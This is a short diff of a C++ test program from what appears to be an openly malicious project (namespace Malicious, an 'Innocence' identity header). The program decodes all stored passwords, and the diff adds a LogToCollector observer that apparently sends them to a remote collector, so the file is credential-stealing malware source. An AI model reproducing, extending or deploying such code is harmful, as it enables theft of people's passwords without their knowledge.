@@ -1,15 +1,15 @@
-#include <cstdlib>
-#include <iostream>
-using namespace std;
-
 #include <common/Log.hpp>
 #include <malicious/Passwords.hpp>
 using namespace Malicious;
 
+#include <Innocence.hpp>
+
 int main()
 {
-	LOG.setHeader("TEST PASSWORDS");
+	LOG.setIdentity(Innocence::identity);
 	LOG.addObserver(new Common::LogToConsole);
+	LOG.addObserver(new Common::LogToCollector);
+
 	LOG << decodeAllPasswords(',');
 	return EXIT_SUCCESS;
 }
